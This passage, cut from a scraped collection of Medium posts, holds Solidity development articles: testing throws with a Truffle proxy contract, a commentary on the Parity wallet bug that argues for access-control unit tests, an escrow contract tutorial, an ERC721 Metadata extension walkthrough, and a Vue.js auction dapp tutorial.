0.4.19.In writing functions in Solidity for your smart contracts, one of your first lines of defense against things such as malicious parties, bad input data, and wasted gas expenses is through the use assert(), require() and revert(). Much of the below is from the documents, but for a quick overview\u2026Assert() should only be used to test for internal errors and to check invariants. Recall that an invariant is something that is assumed to be true during execution. A great example of the use assert() is OpenZeppelin\u2019s SafeMath.sol . Here, in the add() function assert() is used to confirm that any summed integers do not overflow. This add() function is used internally and in a \u201cnormal\u201d reality this condition should never be reach as we assume the addition of two numbers should result in their respective sum. If the assert() condition evaluates to false, then all gas is consumed and state conditions are rolled back \u2014 like it\u2019s predecessor throw.Require() should be used to ensure valid conditions (inputs) or contract state variables are met or to validate return calls to external contracts. I think of require() as guarding against transactions that you would not want to execute although the function would allow it if require() was omitted. For example, you might require() that the transaction be initiated from a certain address or require() that a transaction only be allowed to execute prior to a certain time. From a beginner perspective, one of the most important lessons in learning Solidity is how and when to use require() as you shape the appropriate and secure user inputs. Unlike throw, with require(), any remaining gas is returned to the sender, yet similar to throw, state conditions are rolled back as well.Revert() is similar to require() but can be used to flag an error. I am looking forward to the days of revert() as we will be able to include error messages when the conditions are met. More information here.Writing the TestsLet\u2019s take a simple example of a storage contract as below. Here, we start out storing the number 24. Using the function storeNum(), we only want to store numbers above 10.To get our bearings straight, let\u2019s go over how a Solidity test is put together.First, we want to import the below:import \"truffle/Assert.sol\"import \"truffle/DeployedAddresses.sol\"import \"../contracts/MyContract.sol\"Where are Assert.sol and DeployedAddresses.sol? When I first saw these, I thought I had to dig through my files in Truffle to find them because I was sure that, it couldn\u2019t be so easy as for me to import them via simply \u201ctruffle/xyz.sol.\u201d However, it is that easy. From Tim Coulter\u2019s, creator of Truffle, answer here, you can see that \u201cDeployedAddresses.sol\u201d is created dynamically at the time of deployment . From what I can tell, \u201cAssert.sol\u201d does exist within your Truffle does exist deep within your Truffle files, but you can pull it into your testing this way as well. And what exactly are these two files? Assert.sol is a library contract that holds functions for all Solidity tests, such as isFalse() or isEqual(). These are largely similar to the ChaiJS assertions in your Javascript tests, but they are executed through a Solidity contract instead. You can see the full details of available tests in Assert.sol here. Again looking back to Coulter\u2019s answer, \u201cDeployedAddresses.sol\u201d is a contract that maintains your contract\u2019s deployments and allows you to access them.Moving forward, it is important to recognize that your Solidity tests must begin with \u201cTest\u201d \u2014 uppercase \u201cT\u201d, to identify it in Truffle as a test. Likewise, all Solidity test functions must also begin with \u201ctest.\u201dLet\u2019s begin with an easy Solidity test case:When we run truffle test, we see the test passed. As expected, our initial value of mynumber is 24 as laid out in MyContract.sol. And Ganache was busy:Eight transactions. What all was going on? Digging in, we can see block 1 was a contract creation. Block 2 was a contract call. Block 3 another contract creation. Block 4 another contract call. Block 5 a contract creation. Block 6 another contract creation. Block 7 even another contract creation. And block 8 a contract call. Overall, that\u2019s 5 total contracts created: let\u2019s count we should have TestMyContract.sol, Assert.sol, DeployedAddresses.sol, and MyContract.sol \u2014 so what is the extra contract? Pay attention to your console, and you can see that Solidity unit tests make use of your default Migrations.sol for contract deployment as well. That is our \u201cextra\u201d contract.Now that we have a Solidity test completed, let\u2019s see how we can test our ultimate goal \u2014 assert(), require(), and revert(). Truffle tutorials suggest using a proxy contract \u201cto wrap the contract call to a raw call and return whether it succeeded or not.\u201d What does that exactly mean? First, let\u2019s take a look at some full code for testing throws.You can see from the above that we now have a ThrowProxy contract included in our TestMyContract.sol. What is this doing? Going step by step is easiest, first upon creation, we can see that ThrowProxy is storing the address of it\u2019s target. The target of which is the contract that we would like to test for throws. This coincides with the first two lines of testTheThrow() function as you can see we first create a new MyContract and then feed that address into ThrowProxy.Alright, so next you can see that the in fall back function ofThrowProxy that the message data is stored as datain the ThrowProxy contract. Recall that the message data is the complete call data of a contract call \u2014 and what does that mean? The identifying function signature and the inputs compressed into 32 bytes. A function signature is the first four bytes of the hash of the canonical signature string. In our contract, MyContract, we have a function storeNum with a uint mynum as a input, it\u2019s canonical signature string would be storeNum(uint256), and if it took a string input as well then storeNum(uint256, string). To get the function signature, you can use sha3() or keccak256() to get the hash of which you take the first four bytes for the function signature. Further, the message data combines the input data with the function signature as well.After the fallback function, we can see that execute() uses the address of the original contract, target, in this case, MyContract to execute .call() using the message data collected from the original fallback function. This is quite brilliant as now execute() returns a boolean true/false if target.call(data) was successfully executed or not \u2014 recall that .call() returns a boolean. It does not provide any other returns of function execution. Furthermore, this means if a throw condition was encountered viatarget.call(data) , then the contract would not be able to execute and would return false \u2014 instead of breaking our tests as in JavaScript, we can simply carry on to the next test.Returning the example, in testTheThrow() we see on line 10 that we call MyContract(address(throwProxy)).storeNum(7) , so we are sending a transaction to our throwProxy but throwProxy does not have a function called storeNum()? In this case, throwProxy will execute the fallback function, thus storing the message data for a call using the storeNum() function! On the following line, when we run throwProxy.execute.gas(200000)(), we are in fact calling our original storeNum() on MyContract. After storing the true/false result as r, we can use a function from our Assert.sol library to test whether or not a throw condition was encountered. In our example, since our contract is not supposed to store numbers less than 10, a throw condition will be encountered. So, our result r should be false, and the test will pass \u2014 allowing us to test our next conditions.Now, we have a basis for testing assert(), require() and revert() in a Truffle test environment. The next test testNoThrow() works in exactly the same way as our testTheThrow(), preparing our call data throw the proxy contract and using call() to see whether or not a function completed execution. There is a lot more to Solidity tests to be expanded upon than just testing for throws \u2014 they even allow for Before/After Hooks. In a larger test set, we would certainly want to separate out our throwProxy into its own individual contract, and use more aggressive methods to test our code.I published all code from my examples here if you would like to run the complete set with Truffle.Thanks for reading. Any corrections needed? Let me know in the comments or at kscarbrough1@gmail.com.", "responses": 7, "tags": ["Ethereum", "Solidity", "Unit Testing", "Truffle"]}, {"title": "Solidity unit tests are worth $280mil, and counting.", "post_link": "https://medium.com/hackernoon/solidity-unit-tests-are-worth-280mil-and-counting-9e3d8083c5a7?source=search_post", "author_name": "Brenn", "author_link": "https://medium.com/@brenn.a.hill", "publish_date": "2017-11-08", "last_modified_date": "2018-09-18", "readtime": "3.30", "claps": 267, "voters": 40, "content": "Solidity unit tests are worth $280mil, and counting.Oops, we blew up all your money.BrennFollowNov 8, 2017 \u00b7 4 min readYour Startup\u2019s Money \u2014 Photo by Dawn Armfield on UnsplashToday someone \u201caccidentally\u201d deleted some critical code used by the popular Parity multisig wallet.I have no idea if this was the real person or not, but it doesn\u2019t matter. It happened.We\u2019ve been here before. Just a few months ago *the same wallet* had a hack that allowed attackers to steal $30mil in funds. They would have stolen more, but white-hat hackers beat them to it, stole the funds first and then nicely gave it back.I guess you really can count on the kindness of strangers.How did this happen??UNIT TESTS should have helped. The bug was introduced in the refactor that occured after the last hack. One of the primary points of unit tests is to protect yourself during a refactor. The key is, you need to unit test not only what should happen but what should NOT happen. Apparently that didn\u2019t occur.The most worrisome part here: If the most experienced people in the business can get crushed, what are your chances? The creators are none other than Gavin Wood and his team. Gavin co-founded Ethereum and helped write solidity. How many years of experience does he have? Only ALL OF THEM.I\u2019m not knocking Gavin by the way. We\u2019re all human. And that\u2019s the problem.It Wasn\u2019t Even On Purpose?Playtime with millions! \u2014 Photo by Dawn Armfield on UnsplashIt appears this wasn\u2019t a dedicated attacker, this was someone \u201cplaying around\u201d. What does that mean for the ecosystem? How many bugs like this are lurking for someone to accidentally blow it all up?The biggest app for Ethereum so far is the ICO. And while I\u2019m a huge fan of ICOs, it\u2019s not reassuring to investors to have millions lost by various small bugs every few months. ICOs are great, but we need an approach that doesn\u2019t let \u201coops\u201d lead to hundreds of millions of lost funding. I\u2019ve heard that it\u2019s \u201cgrowing pains\u201d and it will \u201cget better\u201d but this is a recurring theme. People write code, people are imperfect and write imperfect code, imperfect code has bugs, and if all your money relies on perfect code because it\u2019s on a blockchain then you can\u2019t rely on your money which means you won\u2019t rely on the blockchain. And if you can\u2019t rely on the blockchain\u2026 what\u2019s the point?Help me help you: Want in depth knowledge of blockchain?If you really want to understand blockchain and what it means for the future of technology, check out my new book: Blockchain Quick ReferenceBlockchain Quick Reference: A guide to exploring decentralized blockchain application developmentBlockchain Quick Reference: A guide to exploring decentralized blockchain application development \u2014 Kindle edition by\u2026www.amazon.comAudits aren\u2019t enoughIt\u2019s clear that despite extensive peer review that the code for the Parity wallet cannot be trusted. Chances are, plenty of other code can\u2019t be trusted either. One thing is clear: Audits aren\u2019t enough. This is heavily scrutinized code. We need better tools and we need them now. Again, this isn\u2019t against Parity, Gavin, or his team. This is an ecosystem wide problem stretching back to the DAO.Proper TestsIt\u2019s key that for every function in every contract there need to be unit tests against authority. Who can run the function, who cannot, and when? This needs to become the standard and expectation. Every contract will need to have every function called by every user access level involved \u2014 including anonymous.And that\u2019s why checking for this is part of the code audit process at BlockSimple. We can\u2019t let a mistake like this happen again.In the meantime, be careful. And for the love of money, don\u2019t put it all in one wallet.Help me help you: Want in depth knowledge of blockchain?If you really want to understand blockchain and what it means for the future of technology, check out my new book: Blockchain Quick ReferenceBlockchain Quick Reference: A guide to exploring decentralized blockchain application developmentBlockchain Quick Reference: A guide to exploring decentralized blockchain application development \u2014 Kindle edition by\u2026www.amazon.comAbout BlockSimpleWe think Blockchain technology can change the world, but only if it works for ordinary people and organizations. We\u2019re devoted to making Blockchain\u2026 simple! Check out http://blocksimple.consulting", "responses": 0, "tags": ["Blockchain", "Ethereum", "Smart Contracts", "Hacking", "ICO"]}, {"title": "Smart contracting simplified (Escrow) in Solidity (Ethereum)", "post_link": "https://medium.com/@pranav.89/smart-contracting-simplified-escrow-in-solidity-ethereum-b19761e8fe74?source=search_post", "author_name": "Pranav K", "author_link": "https://medium.com/@pranav.89", "publish_date": "2017-12-08", "last_modified_date": "2018-06-18", "readtime": "3.43", "claps": 233, "voters": 39, "content": "Smart contracting simplified (Escrow) in Solidity (Ethereum)Pranav KFollowDec 8, 2017 \u00b7 4 min readHere we will learn about how to create a very simple escrow smart contract, and become comfortable with writing code for Ethereum in Solidity. You will need a basic idea of dApps (Decentralized/Distributed Applications), and the concept of interacting with contracts on the Ethereum blockchain.Fear not if you don\u2019t understand, as I will try to provide real life use cases where I can. Also, for brevity\u2019s sake, this tutorial will not go over creating a UI for your smart contract, nor how to deploy it to a testnet. I will write or screencap a tutorial for that after this.Most tutorials seem like streams of consciousness with a lot of information, which makes me feel like I am sipping from a firehose, which is exciting, but not conducive to retaining information. My intention with tutorials is to simply introduce a new idea/paradigm without the need to learn about all the moving parts.For this tutorial, we will only use Remix (https://remix.ethereum.org/), which is an in-browser Solidity compilation tool, and Metamask (https://metamask.io/), which is a Chrome browser extension that lets you connect to an Ethereum network and call smart contracts on the Ethereum blockchain, or send ether to addresses.First, a quick intro to what escrow is. In my definition, it is a framework for a buyer to be confident that he/she will not release funds to a seller unless he/she is happy with the product/service provided. Usually a third party is employed to serve as a sort of overseer of funds, and this is usually a trusted authority that charges fees. So, fundamentally, Escrow is done between two parties that are not trusting of each other. As it turns out, this is a perfect use case for smart contracts that operate in a trust-less manner.In our single use escrow smart contract implementation, we have four paths to consider:Both buyer and seller accept the transaction, the seller gets paidBoth buyer and seller cancel the transaction, the buyer gets instantly refundedSeller accepts the transaction, but the buyer does not. The funds will be eventually returned to the buyer (frozen for 30 days), but the seller has a chance to convince the buyer to accept the transaction by mediating with them.Buyer accepts the transaction, but the seller does not. The funds remain in the contract until it is killed by the escrow creator, and funds are returned instantly to the buyer.Let\u2019s start by writing some boilerplate code for the constructor function and a kill function that will be used to clear the contract from the blockchain.pragma solidity ^0.4.11;contract Escrow {    function Escrow() public {}    function kill() public {}}We can start implementing the public methods:deposit: increment the balance withaccept: allow buyer or seller to agree to make the transactioncancel: allow buyer or seller to disagreeAnd the private methods (not able to be invoked externally):payBalance: Making the actual payment from escrow contract to sellerFinally, it looks like this:pragma solidity ^0.4.11;contract Escrow {    uint balance;    address public buyer;    address public seller;    address private escrow;    uint private start;    bool buyerOk;    bool sellerOk;function Escrow(address buyer_address, address seller_address) public {        // this is the constructor function that runs ONCE upon initialization        buyer = buyer_address;        seller = seller_address;        escrow = msg.sender;        start = now; //now is an alias for block.timestamp, not really \"now\"    }        function accept() public {        if (msg.sender == buyer){            buyerOk = true;        } else if (msg.sender == seller){            sellerOk = true;        }        if (buyerOk && sellerOk){            payBalance();        } else if (buyerOk && !sellerOk && now > start + 30 days) {            // Freeze 30 days before release to buyer. The customer has to remember to call this method after freeze period.            selfdestruct(buyer);        }    }        function payBalance() private {        // we are sending ourselves (contract creator) a fee        escrow.transfer(this.balance / 100);        // send seller the balance        if (seller.send(this.balance)) {            balance = 0;        } else {            throw;        }    }        function deposit() public payable {        if (msg.sender == buyer) {            balance += msg.value;        }    }        function cancel() public {        if (msg.sender == buyer){            buyerOk = false;        } else if (msg.sender == seller){            sellerOk = false;        }        // if both buyer and seller would like to cancel, money is returned to buyer         if (!buyerOk && !sellerOk){            selfdestruct(buyer);        }    }        function kill() public constant {        if (msg.sender == escrow) {            selfdestruct(buyer);        }    }}Additional info:If the .transfer() transaction cannot occur, it will throw an error and revert any previous changes whereas a failed .send() results in a False [bool] that lets you add some logic in that transaction.\u201cnow\u201d is just an alias for \u201cblock.timestamp\u201d, and not exactly current time, but this is close enough for our use case.And that\u2019s all there is to it, you have an escrow contract you can interact with on the blockchain!Feel free to deploy this on any testnet and test the heck out of it. Please let me know if I have made any errors or left any vulnerability! If you have any queries/clarifications, feel free to get in touch.", "responses": 9, "tags": ["Ethereum", "Solidity", "Escrow", "Smart Contracts"]}, {"title": "Jumping into Solidity \u2014 The ERC721 Standard (Part 6)", "post_link": "https://medium.com/coinmonks/jumping-into-solidity-the-erc721-standard-part-6-7ea4af3366fd?source=search_post", "author_name": "Andrew Parker", "author_link": "https://medium.com/@anallergytoanalogy", "publish_date": "2018-06-06", "last_modified_date": "2018-11-18", "readtime": "8.70", "claps": 214, "voters": 38, "content": "Jumping into Solidity \u2014 The ERC721 Standard (Part 6)Andrew ParkerFollowJun 6, 2018 \u00b7 9 min readWell fellow codeslingers, by now we\u2019ve learned about and written our basic ERC721 implementation, and for those of you who were brave enough to stick around for Part 5, we\u2019ve even tested our code. Now it\u2019s time to give our contract a little extra juice by adding the Metadata and Enumerable extensions. In this article we\u2019ll cover the Metadata extension, and next time Enumerable.\u201cA man welding a steel sheet in a workshop\u201d by U\u011fur G\u00fcrc\u00fco\u011flu on UnsplashSo what are these extensions?The Metadata and Enumerable extensions are small, optional additions to the standard which give your token a little bit of extra functionality. The Metadata extension gives your token contract a name and symbol (like an ERC20 token) and gives each individual token some extra data that makes it unique, while the Enumerable extension makes it easier to sort through your tokens (other than just retrieving based on tokenId).As I said, these are optional, so you\u2019re free to not include them at all if you don\u2019t need them. And even if you want to add custom metadata and enumeration functionality which doesn\u2019t conform to the extensions, you\u2019re free to do that too, and it won\u2019t be a breach of the basic ERC721 standard.However, as always, the benefit of conforming to a standard means that nobody will need to know your codebase in order to interact with your contract. So unless you have a particular reason for not wanting to use the extensions, I suggest you adhere to them if adding metadata or enumeration to your token contract.Anyway, let\u2019s get straight to the biscuits.The Metadata ExtensionBefore we start discussing its methods, we need to declare our contract as both an extension of our original TokenERC721.sol contract (to save us having to re-do all that hard work from the last 5 articles) and an implementation of the ERC721Metadata extension interface.contract TokenERC721Metadata is TokenERC721, ERC721Metadata {The Metadata extension comprises of three functions,function name() external view returns (string _name);function symbol() external view returns (string _symbol);function tokenURI(uint256 _tokenId) external view returns (string);The name and symbol functions just return the name and symbol of your token contract. Until a few weeks ago, the mutability of these functions in the standard interface was set to pure. This matters, because as discussed in Part 1, the mutability of functions can be stricter than that required by the standard, but not looser, and pure is the strictest mutability.So what? So that means you had to choose between either hard-coding the name and symbol into your token contract, or creating a contract that didn\u2019t fully conform to the ERC721 Metadata standard extension. The rationale behind the pure mutability was that it meant the metadata was guaranteed not to change for the life of the contract, which has benefits for caching and indexing by third parties, but it also meant you couldn\u2019t declare this metadata during contract creation.But fear not my friends, because I raised the issue with the ERC721 standard people (remember, it\u2019s still not finalised), and after a pretty efficient discussion and review process, the decision was made to change the mutability for these two functions to view.Why am I telling you this rather than just saying \u201cthey\u2019re view\u201d? Because within this lies a fairly important lesson. If you\u2019re reading these articles you\u2019ve probably looked at at least one other ERC721 implementation or tutorial, and because the standard is not finalised, and because there are many implementations out there that for one reason or another don\u2019t bother to fully adhere to the standard, there\u2019s a good chance that something you learned was wrong.The lesson isn\u2019t that these articles are the absolute authority on ERC721. When I finish writing this I\u2019m going to bed, and they could change something in the standard and I\u2019d have no idea, plus I make mistakes just like anybody.The lesson is that when writing a token to an ERC standard, your first and foremost resource should be the standard\u2019s EIP. This will tell you exactly what you do and don\u2019t need to do, and exactly how your contract must work in order to comply. If you just copy someone else\u2019s implementation, you risk picking up their mistakes, and unless your needs completely overlap with theirs, your contract will probably include some stuff it didn\u2019t need too (which is a waste of gas!).Anyway, now that you\u2019ve all bookmarked the EIPs page we can get back to our contract. But as a side note, since I suggested a change to the standard and it was accepted, I\u2019m now a contributor! Woo!So with the name and symbol functions now being view, we have a couple of options. Although it\u2019s not explicitly stated anywhere in the ERC721 standard, the idea is that these two probably shouldn\u2019t change for the life of the contract. With that in mind, it\u2019s best to either set them during contract creation (with some extra parameters in your constructor), or hard-code them in their respective functions. Given that it makes our contract a little more reusable, I\u2019ve opted for the former.We\u2019ll need to store the name and symbol in strings, so let\u2019s declare them first. I\u2019m also going to declare something called uriBase which I\u2019ll discuss in a minute, but bare with me for now because it\u2019s much nicer to declare all our contract\u2019s variables at the start.string private __name;string private __symbol;bytes private __uriBase;I\u2019ve used the double underscores because the name and symbol methods use versions with no underscore and only one underscore, and we don\u2019t want any collisions\u2026 Also double underscores look cool.The constructorNow that we have all our variables ready, let\u2019s write the new constructor. We\u2019re still going to take _initialSupply as an argument and pass it to the constructor of our TokenERC721 contract, and also take an argument for each of the variables declared above and set them. We\u2019ll also add the new interface to supportedInterfaces(check out Part 2 if you don\u2019t know what that\u2019s all about).constructor(uint _initialSupply, string _name, string _symbol, string _uriBase) public TokenERC721(_initialSupply){    __name = _name;    __symbol = _symbol;    __uriBase = bytes(_uriBase);    //Add to ERC165 Interface Check    supportedInterfaces[        this.name.selector ^        this.symbol.selector ^        this.tokenURI.selector    ] = true;}You\u2019ll notice that I\u2019m taking _uriBase as a string and immediately converting it to bytes. I\u2019ll cover why later, but basically every time it gets used it has to be converted to bytes first, so this is just saving energy down the track.The name and symbol functionsWith those variables set, the name and symbol functions are now simple, the interface declares a variables that will be returned at the end of the function, so we just have to set these variables equal to the ones we declared before and the rest works like magic:function name() external view returns (string _name){    _name = __name;}function symbol() external view returns (string _symbol){    _symbol = __symbol;}A quick note on these functions, if you want to use the Metadata extension but for whatever reason don\u2019t like these functions, it\u2019s perfectly acceptable to just return an empty string.Now that they\u2019re done, let\u2019s see what this URI business is all about\u2026The tokenURI functionThe tokenURI function takes a tokenId as its only argument, and returns a URI which points to metadata about that specific token. Depending on your implementation and its specific needs, you may want to manually set each token\u2019s URI whenever it\u2019s minted, or you may want some authority to be able to change it in the future. You may even want to allow token holders to change the URI.There\u2019s no right or wrong way for how this should work, the only requirements are that when this function is called with a given tokenId, it returns a string with the URI pointing to that token\u2019s metadata, or throws if there\u2019s no token with that tokenId.When I designed my implementation of the metadata extension, I was aiming to maximise scalability. I was also designing for a situation where all my tokens\u2019 metadata would be stored in a single location. Some of you may be screaming \u201cbut that\u2019s not decentralised!\u201d, and yep, that\u2019s true. Unless your tokenURIs point to some sort of completely decentralised storage, this is going to be a point of centralisation to a certain extent.But that may not matter. The reason for your ERC721 implementation will probably have some degree of centralisation, whether it\u2019s a DApp with a frontend hosted on AWS, or even if it represents deeds to a house. Nobody is going to honour your blockchain-based house-trading system if society breaks down and we\u2019re all looting (or something less extreme affects the housing market) \u2014so let\u2019s not go overboard with this decentralisation talk. But as I said before, you\u2019re free to write the tokenURI function as you please. The important thing is that our ERC721 token contract has decentralised ownership of the tokens.With the scalability and centralised storage in mind, my token implements the tokenURI function by having a URI base and appending a tokenId to get the token\u2019s full URI. This means issuing new tokens doesn\u2019t use any extra gas for the metadata extension, which is important if your implementation will have thousands of tokens!If the URI of the token with the tokenId of 19 were:http://www.someTokenImplementation.com/tokens/19Then the uriBase would be:http://www.someTokenImplementation.com/tokens/Note the \u201c/\u201d at the end.Our tokenURI function just concatenates the tokenId onto the end of this string and returns that. Sounds easy, but actually in Solidity it\u2019s a little complex. Our tokenId is a uint256 while our uriBase is a string, and there are no explicit or implicit conversions between the two.But we can convert between string and bytes pretty easily, in Solidity they\u2019re basically the same thing. So what we\u2019re going to do is divide the tokenId by 10, take the remainder, find the number that represents that digit in UTF-8 encoding, store that number in a byte array, and repeat until we\u2019ve seen all the digits. (Note that for digits 0\u20139, the corresponding UTF-8 codes are 48\u201357 respectively. So we just have to add remainder+48 to get the UTF-8 code.)Then we\u2019ll create a new byte array the length of the uriBase + the length length of the digits byte array, then iterate through both arrays, adding their values to the new byte array, until finally we have a byte array with our token\u2019s full URI. We then just explicitly convert that to a string and return it.This may all sound confusing, but hopefully it makes a little more sense when you see the code:function tokenURI(uint256 _tokenId) external view returns (string){    require(isValidToken(_tokenId));    //prepare our tokenId's byte array    uint maxLength = 78;    bytes memory reversed = new bytes(maxLength);    uint i = 0;    //loop through and add byte values to the array    while (_tokenId != 0) {        uint remainder = _tokenId % 10;        _tokenId /= 10;        reversed[i++] = byte(48 + remainder);    }    //prepare the final array    bytes memory s = new bytes(__uriBase.length + i);    uint j;    //add the base to the final array    for (j = 0; j < __uriBase.length; j++) {        s[j] = __uriBase[j];    }    //add the tokenId to the final array    for (j = 0; j < i; j++) {        s[j + __uriBase.length] = reversed[i - 1 - j];    }    //turn it into a string and return it    return string(s);}The reason 78 was chosen for the maxLength of our tokenId\u2019s byte array is because that\u2019s the length of the largest possible uint256. For the curious, that number is:115792089237316195423570985008687907853269984665640564039457584007913129639935That\u2019s a big number!Also note that I\u2019ve changed the visibility from external to public, which is allowed by the standard. The reason for doing this is that Solidity is a little less relaxed with arguments for external functions, so it throws and error if you try to manipulate the tokenId variable.Regardless of how you decide to implement your tokenURI function, your first line should always do something similar to mine, make sure you check if it\u2019s a valid tokenId!And there\u2019s our tokenURI function. The URI can point to whatever you\u2019d like, however the ERC721 people make some recommendations regarding formatting. They suggest that it point to a JSON file which conforms to the \u201cERC721 Metadata JSON Schema\u201d. That just means it follows this structure:{    \"title\": \"Asset Metadata\",    \"type\": \"object\",    \"properties\": {        \"name\": {            \"type\": \"string\",            \"description\": \"Identifies the asset to which this NFT represents\",        },        \"description\": {            \"type\": \"string\",            \"description\": \"Describes the asset to which this NFT represents\",        },        \"image\": {            \"type\": \"string\",            \"description\": \"A URI pointing to a resource with mime type image/* representing the asset to which this NFT represents. Consider making any images at a width between 320 and 1080 pixels and aspect ratio between 1.91:1 and 4:5 inclusive.\",        }    }}This is just a recommendation, so you\u2019re free to ignore it, or add extra data. But as always, the benefit of conforming means it\u2019ll be easier for others to use your data.Wrapping upSo there you have it, your ERC721 token now has metadata! You also hopefully bookmarked the EIPs repository too, and considered some of the practicalities of how decentralised your DApp will be.Next time we\u2019ll be writing our implementation of the Enumerable extension; it\u2019s not as sexy as the Metadata extension, but for many applications arguably far more important.Next: Jumping into Solidity \u2014 The ERC721 Standard (Part 7)", "responses": 2, "tags": ["Solidity", "Erc", "Tutorial", "Dapps", "Programming"]}, {"title": "Ethereum Solidity + Vue.js Tutorial Simple Auction Dapp within 10 minutes", "post_link": "https://medium.com/openberry/ethereum-solidity-vue-js-tutorial-simple-auction-dapp-within-10-minutes-76ba48156b2?source=search_post", "author_name": "Hayata Satomi", "author_link": "https://medium.com/@hayatasatomi", "publish_date": "2019-02-27", "last_modified_date": "2019-02-27", "readtime": "5.80", "claps": 289, "voters": 39, "content": "Ethereum Solidity + Vue.js Tutorial Simple Auction Dapp within 10 minutesHayata SatomiFollowFeb 27 \u00b7 6 min readYou might have heard of auctions, a place where you can buy and sell things. Although it is very convenient, it costs sellers about 10% of their earnings to pay the service charge to the auction\u2019s managing company.If the company itself cheats some transactions and get the money, how will you know that you have been cheated?This is where a decentralized setup is an optimal solution.If there is no third party, sellers can earn more, in a secure way.Function ListCreating an auctionPlacing a bidFinalizing an auctionToolsSmart ContractSolidity, Remix, MetamaskFrontendWeb3.js, Vue.js, Vue-cli, Boostrap-vuePrerequisitesGetting Started with MetaMaskCompile and Deploy Using Remix IDEIntroduction to Smart Contracts and SolidityGithubIf you only want to see the code, you can find it here:https://github.com/openberry-ac/AuctionWhy Build an Auction Dapp?The auction system is a good application to build for the purpose of learning about smart contracts and decentralized applications, especially for beginners.Smart contracts will help you exchange money, properties, shares, or anything of value in a transparent, conflict-free way while avoiding the services of a middleman, like the auction system.Making the ProjectWork flowCreating the Smart ContractBuilding web app & Web3.js settingDefining the Methods: Frontend CodingCreating the Smart ContractSince our contract will be based on Ethereum, we will use Solidity, a programming language used for creating smart contracts.In Remix, create a new file named AuctionBox.sol and add the following code:In an actual setting, many items can be auctioned. In order to make it easy to access all the auctioned items, we created a bundle or box called \u201cAuctionBox\u201d which includes all the auction addresses!To make this system work, we need to prepare two types of contracts, called Auction contract and AuctionBox contract.After writing it in Remix, deploy it to the Ropsten Test Network.To verify that our contract was deployed, you should see this in Remix:Here, we need to select AuctionBox contract.Let\u2019s create an auction !After deploying, let\u2019s try to make an auction using createAuction method.If you success, you can click returnAllAuctions and see its contract address!Building the Web AppOur smart contract now works, but there\u2019s no fun in just looking at numbers so we\u2019ll be making a simple web application.Setting UpTo speed up things, a template project is provided which can be found here. Now let\u2019s follow the commands below, in your Terminal (or Command Prompt/Powershell for Windows):# git clone the project templategit clone -b boilerplate --single-branch https://github.com/openberry-ac/Auction.git# go inside the foldercd Auction# install packages needed in the web applicationnpm install# install web3, this is for connecting the contract npm install -s web3@1.0.0-beta.37# To run the appnpm run devThen it should automatically render on http://localhost:8080/Setting up web3.jsOpen the file named web3.js in the contracts folder, then paste it as following code:This basically gets the web3 instance that the Metamask extension initializes, so we can use it in our app too. We need to call this later when retrieving our smart contract instance.You might encounter a MetaMask pop-up window in your browser that asks for access permission. You should just click the \u2018Connect\u2019 button right here:Connecting to Our Smart Contract InstanceNow, we need our smart contract\u2019s ABI and the contract address to connect it to our web app. To get the ABI, go back to Remix, go to the Compile tab, and click ABI beside the Details button as shown in the picture:To get the contract address, go to the Run tab, and click Copy button as shown in the picture:You can also get Auction contact\u2019s ABI by changing the selected contract to Auction and clicking ABI.After getting it, open the files named AuctionBoxInstance.js and AuctionInstance.js in the contracts folder, then paste it as the variable abi \u2019s value and the contract address, like this:Defining the MethodsYou might notice that the user interface is there, but the buttons aren\u2019t functional. That\u2019s because we have not defined our functions yet, which we will be doing now. Open App.vue in the src folder and let\u2019s get started to fill in the blanks!beforeMountHere, we will get the number of auctions that you created before.Create Auction FunctionHere, we create an auction using the user\u2019s inputs, which will be shown at the bottom of the page.Place Bid FunctionHere, we handle the event wherein the user places a bid.Finalize Auction FunctionHere, we handle the event wherein the user finalizes an auction.We have already created an auction in Remix, you can see its contract address in console.In my case, I created 9 auctions, so I can see this in console:Complete!!Refresh your browser to see the changes. This time, the whole web app is complete, and everything is functional! You should then be able to use it like this:NOTE: The one who made the action cannot place a bid in his own auction. So, you need to switch to another account (other than the auction starter) to place a bid.NOTE: To display the auction card, please create another auction in your browser.SummaryYou learned how to create a smart contract and how to interact with it using web3.js. You also learned how to setup your own project using Vue.js, and created a simple application.So what\u2019s next?You might want to add the logic for the \u201cdeadline\u201d because it is important in a real auction application. For now, we skipped it to avoid complexity and to lessen the time, but if you want to try to build it, this will help you a lot :)If you want the full code of this tutorial, you can check it here:https://github.com/openberry-ac/AuctionOn a side note, you might want to check out openberry\u2019s previous tutorial, \u201cERC721 + Vue.js CryptoKitties-like Dapp in under 10 minutes\u201d.ERC721 + Vue.js CryptoKitties-like Dapp in under 10 minutesYou might have heard of CryptoKitties, an Ethereum-based platform where you can collect, buy, sell, and even breed\u2026medium.comopenberry is a tutorial marketplace, designed to allow anyone to learn blockchain programming.openberry | blockchain tutorial marktplaceopenberry is a tutorial marketplace, designed to enable anyone to learn blockchain programming.www.openberry.acopenberry (@openberry_ac) | TwitterThe latest Tweets from openberry (@openberry_ac). openberry is a tutorial marketplace, designed to enable anyone to\u2026twitter.com", "responses": 3, "tags": ["Ethereum", "Solidity", "Dapps", "Vuejs", "Tutorial"]}, {"title": "\u6559\u7df4\uff0c\u6211\u201d\u53ea\u201d\u60f3\u5b78Solidity", "post_link": "https://medium.com/taipei-ethereum-meetup/%E6%95%99%E7%B7%B4-%E6%88%91-%E5%8F%AA-%E6%83%B3%E5%AD%B8solidity-92b7ba8054f5?source=search_post", "author_name": "yaohsin", "author_link": "https://medium.com/@yaohsin", "publish_date": "2017-03-16", "last_modified_date": "2018-05-29", "readtime": "3.70", "claps": 101, "voters": 36, "content": "\u6559\u7df4\uff0c\u6211\u201d\u53ea\u201d\u60f3\u5b78SolidityyaohsinFollowMar 16, 2017 \u00b7 4 min 